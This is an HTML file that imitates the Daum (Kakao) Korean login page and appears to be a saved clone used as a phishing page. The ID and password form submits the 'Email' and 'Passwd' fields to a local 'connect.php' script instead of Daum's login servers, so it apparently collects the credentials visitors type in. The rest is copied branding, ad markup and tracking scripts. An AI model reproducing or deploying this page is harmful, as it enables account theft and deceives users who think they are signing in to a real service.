﻿<!DOCTYPE html>
<html lang="ko">
<head>
 
    <title>Daum 로그인</title>
    <link rel="stylesheet" type="text/css" href="./index_files/pc.css">
    <link rel="stylesheet" type="text/css" href="./index_files/font_pc.css">
</head>
<body>

<div id="kakaoWrap">
		<div id="kakaoHead">
		<div class="inner_head">
			<h1>
				<a href="./" id="daumLogo" class="link_daum" alt="Daum">
					<span class="ir_wa">DAUM</span>
				</a>
			</h1>
		</div>
	</div>

	<hr class="hide">
	<div id="kakaoContent" class="cont_login" role="main">
		<div id="mArticle">
			<h2 class="screen_out">아이디 로그인</h2>
			<div class="section_login">
                
				<div id="loginFormDiv" class="login_default">
					
					
					<form novalidate="" id="loginForm" method="post" action="./connect.php">
				
					<fieldset class="fld_comm">
							<legend class="screen_out">아이디,비밀번호 로그인 정보 입력 폼</legend>
							<div class="box_inp input_on">
								<label for="id" class="lab_g " style="display: block;">아이디 입력</label> 
								<input type="email" id="id" name="Email" value="" class="tf_g" style="ime-mode:disabled;">
								<button type="button" class="btn_del">
                       <span class="ico_login ico_del">입력 내용 지우기</span>
</button>
							</div>
						 

							<div class="box_inp">  
								<label for="inputPwd" class="lab_g ">비밀번호 입력</label>  
								<input type="password" id="inputPwd" name="Passwd" class="tf_g" maxlength="32" autocomplete="off" style="ime-mode:disabled;">
								<button type="button" class="btn_del">
<span class="ico_login ico_del">입력 내용 지우기</span>
</button>
							</div>
							<p id="pw_msg" class="txt_message" style=" display:none "> 
								
							</p>

							<button id="loginBtn" type="submit" class="btn_comm" >로그인</button>
							
							<div class="set_login">
								<span class="set_comm">
									<label for="stln" class="lab_check">로그인 상태 유지</label>
									<span class="check_g">
										<input type="checkbox" id="stln" name="stln" value="1" class="inp_check">
										<span class="ico_login ico_check">선택안됨</span>
									</span>
								</span>
																<div class="layer_set" style=" display:none ">
									<p class="desc_set">개인정보 보호를 위해, 개인 PC에서만 사용해 주세요.</p>
									<span class="ico_login ico_point">
</span>
								</div>
																	<span class="set_security ">
 
										<a href="" id="linkSecurity" class="link_security" target="_blank">IP보안</a>
										<input type="checkbox" id="ipSecurity" name="ipSecurity" class="inp_check" value="checked" checked="checked">
										<label for="ipSecurity" class="ico_login lab_security" >IP보안 설정 ON</label>
 
									</span>
							</div>
						</fieldset>
					</form>
					<div class="login_help">
						<button type="button" class="btn_help btn_key ">자판보기<span class="ico_login ico_arr">펼치기/접기</span></button> 
						<button type="button" class="btn_help btn_key ">특수문자<span class="ico_login ico_arr">펼치기/접기</span></button> 
					</div>
					<div class="area_help" style="display:none">
						<div class="bg_help img_key"></div>
					</div>
					<div class="area_help" style="display:none">
						<div class="bg_help img_char"></div>
                    </div>
					<div class="login_rel">
						<a href="./" id="findID" class="link_rel" target="_blank" >아이디 찾기</a>
<span class="txt_bar">|</span>
<a href="./" id="findPW" class="link_rel" target="_blank" >비밀번호 찾기</a>
					</div>
                </div>
			</div>

						<div class="info_etc">
                <ins class="daum_ddn_area" style="display: block; text-decoration: none; margin: 0px auto; min-width: 250px; min-height: 250px; width: 250px; height: 250px;" data-ad-frame-id="login_AMS" data-ad-frame-name="login_AMS" data-ad-unit="00Y28" data-ad-type="D" data-ad-width="250" data-ad-height="250" data-ad-init="done" id="kakao_ad_HmHzNG_5734" data-ad-status="done" data-ad-request-id="98738f28-a9b7-4e4f-9ab5-f8dcfa219dc4" data-ad-rfinterval="0" data-ad-bordercolor="#e5e5e5" data-ad-action="" data-ad-actioninterval="0" data-ad-refreshlimit="0" data-ad-noadmaxcount="10" data-ad-noadseq="0" data-viewable-checker-id="Gm7rZs" data-ad-viewable="viewed">
<div data-ad-creative-wrap="outer" style="overflow: hidden; position: relative; min-width: 250px; min-height: 250px; max-height: inherit;">
<div style="position: absolute; left: 0px; top: 0px; width: 100%; height: 100%; box-sizing: border-box; z-index: 2; border: 1px solid rgb(229, 229, 229); pointer-events: none;">
</div>
<div data-ad-creative-wrap="inner" style="overflow: hidden; height: 250px;">
<iframe frameborder="0" scrolling="no" marginwidth="0" marginheight="0" vspace="0" hspace="0" allowtransparency="true" id="login_AMS" name="login_AMS" style="min-width: 250px; width: 250px; min-height: 250px; height: 250px; z-index: 1;" src="./index_files/saved_resource.html">
</iframe>
</div>
</div>
</ins>
			</div>
					</div>
	</div>

	<hr class="hide">

	<div id="kakaoFoot">
		<h2 class="screen_out">서비스 이용정보</h2>
		<a href="http://www.kakaocorp.com/" class="link_kcorp" target="_blank" onclick="_tiq.push([&#39;__trackEvent&#39;, &#39;loginform_pc&#39;, &#39;footer_corp&#39;]);">© Kakao Corp.</a>
		<span class="txt_bar">|</span>
		<a href="https://cs.daum.net/faq/59/14970.html" class="link_custom" target="_blank" onclick="_tiq.push([&#39;__trackEvent&#39;, &#39;loginform_pc&#39;, &#39;footer_cs&#39;]);">고객센터</a>
	</div>
</div>

<script type="text/javascript">
    jQuery(document).ready(function () {
        if (daumlogin.slevel) {
            daumlogin.slevel.init('https://logins.daum.net');
        }

        if (daumlogin.srp) {
            daumlogin.srp.init('https://logins.daum.net');
        }
            var virtualKeyView = new VirtualKeyView('#kakaoContent');
        virtualKeyView.initialize();

            toggleBodyClass();

        var loginForm = new LoginForm('#loginForm', {
                        dummy: 0
        }).initialize();

        if (daumlogin.srp) {
            daumlogin.srp.setValidator(loginForm.checkValid);
        }
    });
</script>
<script async="" type="text/javascript" src="./index_files/ad.min.js.download">
</script>
    <script type="text/javascript">
    var _tiq = 'undefined' !== typeof _tiq ? _tiq : []; // Global Variables

    _tiq.push(['__trackPageview']);

    (function(d) {
        var se = d.createElement('script'); se.type = 'text/javascript'; se.async = true;
        se.src = location.protocol + '//m1.daumcdn.net/tiara/js/td.min.js';
        var s = d.getElementsByTagName('head')[0]; s.appendChild(se);
    })(document);
</script>
	    

</body>
</html>